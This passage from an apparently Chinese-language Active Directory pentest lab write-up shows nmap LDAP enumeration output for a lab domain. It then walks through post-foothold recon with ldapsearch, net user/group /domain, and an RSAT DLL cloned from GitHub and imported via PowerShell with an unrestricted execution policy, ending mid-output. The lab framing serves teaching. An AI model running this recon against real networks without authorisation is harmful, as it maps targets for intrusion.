B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=training,DC=local</span><br><span class="line">|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=training,DC=local</span><br><span class="line">|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=training,DC=local</span><br><span class="line">|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=training,DC=local</span><br><span class="line">|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=training,DC=local</span><br><span class="line">|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=training,DC=local</span><br><span class="line">|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         isCriticalSystemObject: TRUE</span><br><span class="line">|         gPLink: [LDAP://CN=&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;,CN=Policies,CN=System,DC=training,DC=local;0]</span><br><span class="line">|         dSCorePropagationData: 1601/01/01 00:00:00 UTC</span><br><span class="line">|         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=training,DC=local</span><br><span class="line">|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=training,DC=local</span><br><span class="line">|         masteredBy: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         ms-DS-MachineAccountQuota: 10</span><br><span class="line">|         msDS-Behavior-Version: 7</span><br><span class="line">|         msDS-PerUserTrustQuota: 1</span><br><span class="line">|         msDS-AllUsersTrustQuota: 1000</span><br><span class="line">|         msDS-PerUserTrustTombstonesQuota: 10</span><br><span class="line">|         msDs-masteredBy: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         msDS-IsDomainFor: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         msDS-NcType: 0</span><br><span class="line">|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE</span><br><span class="line">|         dc: training</span><br><span class="line">|     dn: CN=Users,DC=training,DC=local</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: container</span><br><span class="line">|         cn: Users</span><br><span class="line">|         description: Default container for upgraded user accounts</span><br><span class="line">|         distinguishedName: CN=Users,DC=training,DC=local</span><br><span class="line">|         instanceType: 4</span><br><span class="line">|         whenCreated: 2020/10/09 15:41:24 UTC</span><br><span class="line">|         whenChanged: 2020/10/09 15:41:24 UTC</span><br><span class="line">|         uSNCreated: 5888</span><br><span class="line">|         uSNChanged: 5888</span><br><span class="line">|         showInAdvancedViewOnly: FALSE</span><br><span class="line">|         name: Users</span><br><span class="line">|         objectGUID: 1650a544-642f-3f48-9b91-ad1efea9893b</span><br><span class="line">|         systemFlags: -1946157056</span><br><span class="line">|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         isCriticalSystemObject: TRUE</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:51:07 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:43:14 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:42:23 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:30:26 UTC</span><br><span class="line">|         dSCorePropagationData: 1601/07/14 04:24:33 UTC</span><br><span class="line">|     dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=training,DC=local</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: group</span><br><span class="line">|         cn: Allowed RODC Password Replication Group</span><br><span class="line">|         description: Members in this group can have their passwords replicated to all read-only domain controllers in the domain</span><br><span class="line">|         distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=training,DC=local</span><br><span class="line">|         instanceType: 4</span><br><span class="line">|         whenCreated: 2020/10/09 15:42:38 UTC</span><br><span class="line">|         whenChanged: 2020/10/09 15:42:38 UTC</span><br><span class="line">|         uSNCreated: 12402</span><br><span class="line">|         uSNChanged: 12404</span><br><span class="line">|         name: Allowed RODC Password Replication Group</span><br><span class="line">|         objectGUID: 5b6cb79-8a3f-534f-87fc-3a7883734ec</span><br><span class="line">|         objectSid: 1-5-21-2501991368-4163896689-842069156-571</span><br><span class="line">|         sAMAccountName: Allowed RODC Password Replication Group</span><br><span class="line">|         sAMAccountType: 536870912</span><br><span class="line">|         groupType: -2147483644</span><br><span class="line">|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         isCriticalSystemObject: TRUE</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:51:07 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:43:14 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:30:26 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:23:38 UTC</span><br><span class="line">|         dSCorePropagationData: 1601/07/14 22:36:49 UTC</span><br><span class="line">|     dn: CN=Denied RODC Password Replication Group,CN=Users,DC=training,DC=local</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: group</span><br><span class="line">|         cn: Denied RODC Password Replication Group</span><br><span class="line">|         description: Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain</span><br><span class="line">|         member: CN=Read-only Domain Controllers,CN=Users,DC=training,DC=local</span><br><span class="line">|         member: CN=Group Policy Creator Owners,CN=Users,DC=training,DC=local</span><br><span class="line">|         member: CN=Domain Admins,CN=Users,DC=training,DC=local</span><br><span class="line">|         member: CN=Cert Publishers,CN=Users,DC=training,DC=local</span><br><span class="line">|         member: CN=Enterprise Admins,CN=Users,DC=training,DC=local</span><br><span class="line">|         member: CN=Schema Admins,CN=Users,DC=training,DC=local</span><br><span class="line">|         member: CN=Domain Controllers,CN=Users,DC=training,DC=local</span><br><span class="line">|         member: CN=krbtgt,CN=Users,DC=training,DC=local</span><br><span class="line">|         distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=training,DC=local</span><br><span class="line">|         instanceType: 4</span><br><span class="line">|         whenCreated: 2020/10/09 15:42:38 UTC</span><br><span class="line">|         whenChanged: 2020/10/09 15:42:38 UTC</span><br><span class="line">|         uSNCreated: 12405</span><br><span class="line">|         uSNChanged: 12433</span><br><span class="line">|         name: Denied RODC Password Replication Group</span><br><span class="line">|         objectGUID: 7b57a5ce-b914-ef44-9afe-4468f9ca230</span><br><span class="line">|         objectSid: 1-5-21-2501991368-4163896689-842069156-572</span><br><span class="line">|         sAMAccountName: Denied RODC Password Replication Group</span><br><span class="line">|         sAMAccountType: 536870912</span><br><span class="line">|         groupType: -2147483644</span><br><span class="line">|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         isCriticalSystemObject: TRUE</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:51:07 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:43:14 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:30:26 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:23:38 UTC</span><br><span class="line">|         dSCorePropagationData: 1601/07/14 22:36:49 UTC</span><br><span class="line">|     dn: CN=Read-only Domain Controllers,CN=Users,DC=training,DC=local</span><br><span class="line">|     dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=training,DC=local</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: group</span><br><span class="line">|         cn: Enterprise Read-only Domain Controllers</span><br><span class="line">|         description: Members of this group are Read-Only Domain Controllers in the enterprise</span><br><span class="line">|         distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=training,DC=local</span><br><span class="line">|         instanceType: 4</span><br><span class="line">|         whenCreated: 2020/10/09 15:42:38 UTC</span><br><span class="line">|         whenChanged: 2020/10/09 15:42:38 UTC</span><br><span class="line">|         uSNCreated: 12429</span><br><span class="line">|         uSNChanged: 12431</span><br><span class="line">|         name: Enterprise Read-only Domain Controllers</span><br><span class="line">|         objectGUID: dbfae556-b42b-d847-99c4-1c9f6fff4ca2</span><br><span class="line">|         objectSid: 1-5-21-2501991368-4163896689-842069156-498</span><br><span class="line">|         sAMAccountName: Enterprise Read-only Domain Controllers</span><br><span class="line">|         sAMAccountType: 268435456</span><br><span class="line">|         groupType: -2147483640</span><br><span class="line">|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         isCriticalSystemObject: TRUE</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:51:07 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:43:14 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:30:26 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:23:38 UTC</span><br><span class="line">|         dSCorePropagationData: 1601/07/14 22:36:49 UTC</span><br><span class="line">|     dn: CN=Cloneable Domain Controllers,CN=Users,DC=training,DC=local</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: group</span><br><span class="line">|         cn: Cloneable Domain Controllers</span><br><span class="line">|         description: Members of this group that are domain controllers may be cloned.</span><br><span class="line">|         distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=training,DC=local</span><br><span class="line">|         instanceType: 4</span><br><span class="line">|         whenCreated: 2020/10/09 15:42:38 UTC</span><br><span class="line">|         whenChanged: 2020/10/09 15:42:38 UTC</span><br><span class="line">|         uSNCreated: 12440</span><br><span class="line">|         uSNChanged: 12442</span><br><span class="line">|         name: Cloneable Domain Controllers</span><br><span class="line">|         objectGUID: 25c7245e-c46-324d-bce1-a6a9ab4608b</span><br><span class="line">|         objectSid: 1-5-21-2501991368-4163896689-842069156-522</span><br><span class="line">|         sAMAccountName: Cloneable Domain Controllers</span><br><span class="line">|         sAMAccountType: 268435456</span><br><span class="line">|         groupType: -2147483646</span><br><span class="line">|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         isCriticalSystemObject: TRUE</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:51:07 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:43:14 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:30:26 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:23:38 UTC</span><br><span class="line">|         dSCorePropagationData: 1601/07/14 22:36:49 UTC</span><br><span class="line">|     dn: CN=Protected Users,CN=Users,DC=training,DC=local</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: group</span><br><span class="line">|         cn: Protected Users</span><br><span class="line">|         description: Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.</span><br><span class="line">|         distinguishedName: CN=Protected Users,CN=Users,DC=training,DC=local</span><br><span class="line">|         instanceType: 4</span><br><span class="line">|         whenCreated: 2020/10/09 15:42:38 UTC</span><br><span class="line">|         whenChanged: 2020/10/09 15:42:38 UTC</span><br><span class="line">|         uSNCreated: 12445</span><br><span class="line">|         uSNChanged: 12447</span><br><span class="line">|         name: Protected Users</span><br><span class="line">|         objectGUID: 1892dad8-4c81-e144-b234-b53136bcf53</span><br><span class="line">|         objectSid: 1-5-21-2501991368-4163896689-842069156-525</span><br><span class="line">|         sAMAccountName: Protected Users</span><br><span class="line">|         sAMAccountType: 268435456</span><br><span class="line">|         groupType: -2147483646</span><br><span class="line">|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         isCriticalSystemObject: TRUE</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:51:07 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:43:14 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:30:26 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:23:38 UTC</span><br><span class="line">|         dSCorePropagationData: 1601/07/14 22:36:49 UTC</span><br><span class="line">|     dn: CN=Key Admins,CN=Users,DC=training,DC=local</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: group</span><br><span class="line">|         cn: Key Admins</span><br><span class="line">|         description: Members of this group can perform administrative actions on key objects within the domain.</span><br><span class="line">|         distinguishedName: CN=Key Admins,CN=Users,DC=training,DC=local</span><br><span class="line">|         instanceType: 4</span><br><span class="line">|         whenCreated: 2020/10/09 15:42:38 UTC</span><br><span class="line">|         whenChanged: 2020/10/09 15:42:38 UTC</span><br><span class="line">|         uSNCreated: 12450</span><br><span class="line">|         uSNChanged: 12452</span><br><span class="line">|         name: Key Admins</span><br><span class="line">|         objectGUID: 5280b2c-b0d3-dd4a-866a-2e50e2931e0</span><br><span class="line">|         objectSid: 1-5-21-2501991368-4163896689-842069156-526</span><br><span class="line">|         sAMAccountName: Key Admins</span><br><span class="line">|         sAMAccountType: 268435456</span><br><span class="line">|         groupType: -2147483646</span><br><span class="line">|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         isCriticalSystemObject: TRUE</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:51:07 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:43:14 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:30:26 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:23:38 UTC</span><br><span class="line">|         dSCorePropagationData: 1601/07/14 22:36:49 UTC</span><br><span class="line">|     dn: CN=Enterprise Key Admins,CN=Users,DC=training,DC=local</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: group</span><br><span class="line">|         cn: Enterprise Key Admins</span><br><span class="line">|         description: Members of this group can perform administrative actions on key objects within the forest.</span><br><span class="line">|         distinguishedName: CN=Enterprise Key Admins,CN=Users,DC=training,DC=local</span><br><span class="line">|         instanceType: 4</span><br><span class="line">|         whenCreated: 2020/10/09 15:42:38 UTC</span><br><span class="line">|         whenChanged: 2020/10/09 15:42:38 UTC</span><br><span class="line">|         uSNCreated: 12453</span><br><span class="line">|         uSNChanged: 12455</span><br><span class="line">|         name: Enterprise Key Admins</span><br><span class="line">|         objectGUID: e6e343-372e-794c-9b8c-2877e2d336ed</span><br><span class="line">|         objectSid: 1-5-21-2501991368-4163896689-842069156-527</span><br><span class="line">|         sAMAccountName: Enterprise Key Admins</span><br><span class="line">|         sAMAccountType: 268435456</span><br><span class="line">|         groupType: -2147483640</span><br><span class="line">|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         isCriticalSystemObject: TRUE</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:51:07 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:43:14 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:30:26 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:23:38 UTC</span><br><span class="line">|         dSCorePropagationData: 1601/07/14 22:36:49 UTC</span><br><span class="line">|     dn: CN=DnsAdmins,CN=Users,DC=training,DC=local</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: group</span><br><span class="line">|         cn: DnsAdmins</span><br><span class="line">|         description: DNS Administrators Group</span><br><span class="line">|         distinguishedName: CN=DnsAdmins,CN=Users,DC=training,DC=local</span><br><span class="line">|         instanceType: 4</span><br><span class="line">|         whenCreated: 2020/10/09 15:43:18 UTC</span><br><span class="line">|         whenChanged: 2020/10/09 15:43:18 UTC</span><br><span class="line">|         uSNCreated: 12481</span><br><span class="line">|         uSNChanged: 12483</span><br><span class="line">|         name: DnsAdmins</span><br><span class="line">|         objectGUID: 40a46e74-18fd-764a-998-6b33573750fd</span><br><span class="line">|         objectSid: 1-5-21-2501991368-4163896689-842069156-1101</span><br><span class="line">|         sAMAccountName: DnsAdmins</span><br><span class="line">|         sAMAccountType: 536870912</span><br><span class="line">|         groupType: -2147483644</span><br><span class="line">|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:51:07 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:43:14 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:30:26 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:23:38 UTC</span><br><span class="line">|         dSCorePropagationData: 1601/07/14 22:36:49 UTC</span><br><span class="line">|     dn: CN=DnsUpdateProxy,CN=Users,DC=training,DC=local</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: group</span><br><span class="line">|         cn: DnsUpdateProxy</span><br><span class="line">|         description: DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).</span><br><span class="line">|         distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=training,DC=local</span><br><span class="line">|         instanceType: 4</span><br><span class="line">|         whenCreated: 2020/10/09 15:43:18 UTC</span><br><span class="line">|         whenChanged: 2020/10/09 15:43:18 UTC</span><br><span class="line">|         uSNCreated: 12486</span><br><span class="line">|         uSNChanged: 12486</span><br><span class="line">|         name: DnsUpdateProxy</span><br><span class="line">|         objectGUID: b58e586e-b5c8-3046-94c3-d56461f06d33</span><br><span class="line">|         objectSid: 1-5-21-2501991368-4163896689-842069156-1102</span><br><span class="line">|         sAMAccountName: DnsUpdateProxy</span><br><span class="line">|         sAMAccountType: 268435456</span><br><span class="line">|         groupType: -2147483646</span><br><span class="line">|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:51:07 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:43:14 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:30:26 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:23:38 UTC</span><br><span class="line">|         dSCorePropagationData: 1601/07/14 22:36:49 UTC</span><br><span class="line">|     dn: CN=Administrator,CN=Users,DC=training,DC=local</span><br><span class="line">|     dn: CN=Guest,CN=Users,DC=training,DC=local</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: person</span><br><span class="line">|         objectClass: organizationalPerson</span><br><span class="line">|         objectClass: user</span><br><span class="line">|         cn: Guest</span><br><span class="line">|         description: Built-in account for guest access to the computer/domain</span><br><span class="line">|         distinguishedName: CN=Guest,CN=Users,DC=training,DC=local</span><br><span class="line">|         instanceType: 4</span><br><span class="line">|         whenCreated: 2020/10/09 15:41:25 UTC</span><br><span class="line">|         whenChanged: 2020/10/09 15:41:25 UTC</span><br><span class="line">|         uSNCreated: 8197</span><br><span class="line">|         memberOf: CN=Guests,CN=Builtin,DC=training,DC=local</span><br><span class="line">|         uSNChanged: 8197</span><br><span class="line">|         name: Guest</span><br><span class="line">|         objectGUID: c66c9f51-4e90-d44d-a310-39e73c18d1b1</span><br><span class="line">|         userAccountControl: 66082</span><br><span class="line">|         badPwdCount: 0</span><br><span class="line">|         codePage: 0</span><br><span class="line">|         countryCode: 0</span><br><span class="line">|         badPasswordTime: Never</span><br><span class="line">|         lastLogoff: 0</span><br><span class="line">|         lastLogon: Never</span><br><span class="line">|         pwdLastSet: Never</span><br><span class="line">|         primaryGroupID: 514</span><br><span class="line">|         objectSid: 1-5-21-2501991368-4163896689-842069156-501</span><br><span class="line">|         accountExpires: 30828-09-13T17:51:29+00:00</span><br><span class="line">|         logonCount: 0</span><br><span class="line">|         sAMAccountName: Guest</span><br><span class="line">|         sAMAccountType: 805306368</span><br><span class="line">|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         isCriticalSystemObject: TRUE</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:51:07 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:43:14 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:30:26 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:23:38 UTC</span><br><span class="line">|         dSCorePropagationData: 1601/07/14 22:36:49 UTC</span><br><span class="line">|     dn: CN=DefaultAccount,CN=Users,DC=training,DC=local</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: person</span><br><span class="line">|         objectClass: organizationalPerson</span><br><span class="line">|         objectClass: user</span><br><span class="line">|         cn: DefaultAccount</span><br><span class="line">|         description: A user account managed by the system.</span><br><span class="line">|         distinguishedName: CN=DefaultAccount,CN=Users,DC=training,DC=local</span><br><span class="line">|         instanceType: 4</span><br><span class="line">|         whenCreated: 2020/10/09 15:41:25 UTC</span><br><span class="line">|         whenChanged: 2020/10/09 15:41:25 UTC</span><br><span class="line">|         uSNCreated: 8198</span><br><span class="line">|         memberOf: CN=System Managed Accounts Group,CN=Builtin,DC=training,DC=local</span><br><span class="line">|         uSNChanged: 8198</span><br><span class="line">|         name: DefaultAccount</span><br><span class="line">|         objectGUID: 80aea15-315b-c146-bb5f-91f06442c7</span><br><span class="line">|         userAccountControl: 66082</span><br><span class="line">|         badPwdCount: 0</span><br><span class="line">|         codePage: 0</span><br><span class="line">|         countryCode: 0</span><br><span class="line">|         badPasswordTime: Never</span><br><span class="line">|         lastLogoff: 0</span><br><span class="line">|         lastLogon: Never</span><br><span class="line">|         pwdLastSet: Never</span><br><span class="line">|         primaryGroupID: 513</span><br><span class="line">|         objectSid: 1-5-21-2501991368-4163896689-842069156-503</span><br><span class="line">|         accountExpires: 30828-09-13T17:51:29+00:00</span><br><span class="line">|         logonCount: 0</span><br><span class="line">|         sAMAccountName: DefaultAccount</span><br><span class="line">|         sAMAccountType: 805306368</span><br><span class="line">|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         isCriticalSystemObject: TRUE</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:51:07 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:43:14 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:30:26 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:23:38 UTC</span><br><span class="line">|         dSCorePropagationData: 1601/07/14 22:36:49 UTC</span><br><span class="line">|     dn: CN=krbtgt,CN=Users,DC=training,DC=local</span><br><span class="line">|     dn: CN=Domain Computers,CN=Users,DC=training,DC=local</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: group</span><br><span class="line">|         cn: Domain Computers</span><br><span class="line">|         description: All workstations and servers joined to the domain</span><br><span class="line">|         distinguishedName: CN=Domain Computers,CN=Users,DC=training,DC=local</span><br><span class="line">|         instanceType: 4</span><br><span class="line">|         whenCreated: 2020/10/09 15:42:38 UTC</span><br><span class="line">|         whenChanged: 2020/10/09 15:42:38 UTC</span><br><span class="line">|         uSNCreated: 12330</span><br><span class="line">|         uSNChanged: 12332</span><br><span class="line">|         name: Domain Computers</span><br><span class="line">|         objectGUID: 34653e5-cbca-3043-86e8-42a6bcf2fc4c</span><br><span class="line">|         objectSid: 1-5-21-2501991368-4163896689-842069156-515</span><br><span class="line">|         sAMAccountName: Domain Computers</span><br><span class="line">|         sAMAccountType: 268435456</span><br><span class="line">|         groupType: -2147483646</span><br><span class="line">|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">|         isCriticalSystemObject: TRUE</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:51:07 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 17:43:14 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:30:26 UTC</span><br><span class="line">|         dSCorePropagationData: 2020/10/10 16:23:38 UTC</span><br><span class="line">|         dSCorePropagationData: 1601/07/14 22:36:49 UTC</span><br><span class="line">|     dn: CN=Domain Controllers,CN=Users,DC=training,DC=local</span><br><span class="line">|     dn: CN=Schema Admins,CN=Users,DC=training,DC=local</span><br><span class="line">|     dn: CN=Enterprise Admins,CN=Users,DC=training,DC=local</span><br><span class="line">| </span><br><span class="line">| </span><br><span class="line">|_Result limited to 20 objects (see ldap.maxobjects)</span><br><span class="line">MAC Address: 00:0C:29:18:49:9B (VMware)</span><br><span class="line">Service Info: Host: DC01; OS: Windows</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.47 second</span><br></pre></td></tr></table></figure>
<p>這邊就取得了 username 和 相關的 <code>namingContexts</code></p>
<p>接力用 <code>ldapsearch</code> 進行探勘</p>
<p><code>ldapsearch -x -b  &quot;dc=training, dc=local&quot; -H ldap://192.168.43.147 (ad IP)</code></p>
<p>因為檔案時間太長了Q (破萬行)</p>
<p>所以放在 <a href="/img/2020/windows_ad/ldapsearch_exampleFile.txt">這裡</a> 給大家自己看</p>
<p>可以得到 <code>RD Dept</code> 裡面的 <code>AStar</code> user<br>或是可以透過 <code>jxplorer</code> 直接看 UI</p>
<p><img src="/img/2020/windows_ad/windows_AD_lab1_7.png" alt=""></p>
<h2 id="以已取得內網機器為前提進行-Recon"><a href="#以已取得內網機器為前提進行-Recon" class="headerlink" title="以已取得內網機器為前提進行 Recon"></a>以已取得內網機器為前提進行 Recon</h2><p>到這一步，我們至少可以取得 AD 和他所管的主機的 user list, </p>
<p>下一步我們模擬已取得 AD 內網一台機器的 shell, 進行Recon</p>
<p>工具列表:</p>
<ul>
<li>net user /domain (Windows)</li>
<li>RSAT (Windows)</li>
<li>ADSI (Windows)</li>
<li>powerview (Windows)</li>
<li>bloodhound (Kali)</li>
</ul>
<h3 id="net"><a href="#net" class="headerlink" title="net"></a>net</h3><p><code>net user /domain</code><br>已 domain 作為分類列出 user<br><img src="/img/2020/windows_ad/windows_AD_lab1_8.png" alt="">  </p>
<p><code>net group /domain</code><br>已 domain 作為分類列出 user<br><img src="/img/2020/windows_ad/windows_AD_lab1_9.png" alt=""></p>
<h3 id="RSAT"><a href="#RSAT" class="headerlink" title="RSAT"></a>RSAT</h3><p><a href="https://www.microsoft.com/zh-TW/download/details.aspx?id=45520" target="_blank" rel="noopener">https://www.microsoft.com/zh-TW/download/details.aspx?id=45520</a><br>這邊我們透過 RSAT 的工具取得更進一步的資訊<br>如果主機有裝 Windows RSAT Tool 的話，dll 路徑通常在<br><code>C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management</code></p>
<p>如果主機沒有裝的話還是可以透過 GitHub 的工具做到<br><code>git clone https://github.com/samratashok/ADModule.git</code></p>
<p>裡面有 dll 可以用，我比對過跟 windows 的一樣，用 windows defender 掃過沒問題</p>
<p>我們把 dll 上傳之後就可以用 powershell include 他了<br><img src="/img/2020/windows_ad/windows_AD_lab1_10.png" alt=""></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab1_11.png" alt=""></p>
<p>(我自己是等了一陣子才完成)<br>以自己滲透的經驗來說，如果直接叫 powershell 的 shell 有可能會得不到回應，因此建議用 cmd 叫 powershell.exe 單獨一行一行執行</p>
<p>下面就直接省略前面 <code>powershell.exe -ExecutionPolicy UnRestricted &quot;import-module .\Microsoft.ActiveDirectory.Management.dll&quot;</code></p>
<h4 id="get-aduser-filter-or-get-aduser-Identity-lt-SamAccountName-in-get-aduser"><a href="#get-aduser-filter-or-get-aduser-Identity-lt-SamAccountName-in-get-aduser" class="headerlink" title="get-aduser -filter * ( or  get-aduser  -Identity &lt;SamAccountName in get-aduser> )"></a>get-aduser -filter * ( or  get-aduser  -Identity &lt;SamAccountName in get-aduser> )</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">GivenName          : </span><br><span class="line">Surname            : </span><br><span class="line">UserPrincipalName  : </span><br><span class="line">Enabled            : True</span><br><span class="line">SamAccountName     : Administrator</span><br><span 